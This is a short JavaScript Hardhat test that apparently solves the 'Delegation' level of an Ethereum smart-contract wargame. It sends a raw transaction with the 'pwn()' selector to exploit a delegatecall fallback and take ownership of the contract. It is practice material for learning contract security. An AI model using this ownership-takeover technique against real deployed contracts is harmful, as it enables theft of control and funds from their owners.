const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Delegation");
  const challengeAddress = await createChallenge(`0x73379d8B82Fda494ee59555f333DF7D44483fD58`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 6-Delegation", async function () {
  const challenge = await getChallenge();

  const interface = ethers.Interface.from(["function pwn()"]);

  [eoa] = await ethers.getSigners();
  tx = await eoa.sendTransaction({
    to: await challenge.getAddress(),
    data: interface.encodeFunctionData("pwn", [])
  });
  await tx.wait();

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
